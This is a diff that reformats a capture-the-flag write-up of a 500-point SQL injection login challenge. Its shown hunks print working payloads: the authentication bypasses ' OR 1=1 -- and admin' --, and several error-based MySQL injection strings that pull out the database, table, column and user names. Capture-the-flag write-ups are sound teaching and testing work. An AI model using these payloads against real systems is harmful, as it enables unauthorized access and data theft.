@@ -24,7 +24,7 @@ aliases = [
 ]
 +++
 
-- Points: 500
+-   Points: 500
 
 ## Description
 
@@ -72,7 +72,7 @@ The query becomes invalid as there is an unterminated string. So, how do we turn
 
 ## Solution
 
-Firstly, I tried to use `' OR 1=1 -- ` as the username and, again, some garbage as the password. However, it didn't work. It didn't even return an error. So I guess this is where "A classic, with a twist." comes in. Next, I tried to just use `admin` as the username and end the query after it by inserting a comment (this is `--` in sql). The resulting input would become `admin' -- ` for the username, the password doesn't matter.
+Firstly, I tried to use `' OR 1=1 --` as the username and, again, some garbage as the password. However, it didn't work. It didn't even return an error. So I guess this is where "A classic, with a twist." comes in. Next, I tried to just use `admin` as the username and end the query after it by inserting a comment (this is `--` in sql). The resulting input would become `admin' --` for the username, the password doesn't matter.
 
 The resulting query would be this:
 
@@ -90,7 +90,7 @@ As [@credmp](https://twitter.com/credmp) correctly pointed out, this only works 
 
 ### Getting the database
 
-As we can see the error on the page itself, we can use a query to give a result inside the error. For instance, to get the database I used the following input: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `. This results into the following query:
+As we can see the error on the page itself, we can use a query to give a result inside the error. For instance, to get the database I used the following input: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --`. This results into the following query:
 
 ```sql
 FROM `users` SELECT * WHERE `username`='' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x3a, FLOOR(RAND(0)*2)) as x FROM information_schema.tables GROUP BY x) as y) -- ' AND `password`=''
@@ -167,7 +167,7 @@ We can only get the tables one by one (as I explained above) so we can use the f
 SELECT table_name FROM information_schema.tables WHERE table_schema='testdb' LIMIT 0,1
 ```
 
-Converted to an input we get `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema='testdb' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `
+Converted to an input we get `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema='testdb' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --`
 
 _Note: to get next table, just edit the `LIMIT` to `1,1`, `2,1` and so on_
 
@@ -187,7 +187,7 @@ A sub-query for columns could be the following:
 SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1
 ```
 
-Which converts to this input: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `
+Which converts to this input: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --`
 
 Which gives us (with other `LIMIT` as well):
 
@@ -211,7 +211,7 @@ A simple `SELECT` query for the username would be:
 SELECT username from users limit 0,1
 ```
 
-Turing this into an input we get `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username from users limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) -- `
+Turing this into an input we get `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username from users limit 0,1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y) --`
 
 We get:
 
